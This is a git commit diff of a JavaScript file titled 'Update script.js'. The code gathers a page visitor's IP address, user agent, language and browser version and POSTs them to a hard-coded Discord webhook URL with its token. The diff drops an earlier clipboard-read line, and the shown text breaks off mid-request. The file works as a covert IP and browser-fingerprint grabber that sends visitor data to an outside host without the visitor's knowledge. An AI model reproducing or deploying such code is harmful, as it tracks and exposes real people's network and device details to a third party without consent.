f91350117acf077c2fe696f929145b653a5f585c
PastebinNotAvaliable <132144508+PasteBinNotAvailable@users.noreply.github.com>
2023-06-22 21:03:51 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,15 +1,13 @@
 function getdata(json) {
- var dataip = json.ip;
   var agent = navigator.userAgent;
   var lang = navigator.language;
   var sys = navigator.appCodeName;
   var sys1 = navigator.appName;
   var sys2 = navigator.appVersion;
-  var sys3 = navigator.clipboard.read;
-  var space = " "
+  var space = " ";
  const xml = new XMLHttpRequest;
       xml.open("POST", "https://discord.com/api/webhooks/1121438794567135304/BNVT5-_I0ur5pWHR93fHGqA1vnQgxz8FIbaqFFPPG0LG5e_bNJnvYqPTASxZ-MgNDda8");
-var udata = dataip +  space + agent + space + lang + space + sys + space + sys1 + space + sys2 + space + sys3
+var udata = json.ip +  space + agent + space + lang + space + sys + space + sys1 + space + sys2;
       xml.setRequestHeader('Content-type', 'application/json');
 
       const params = {
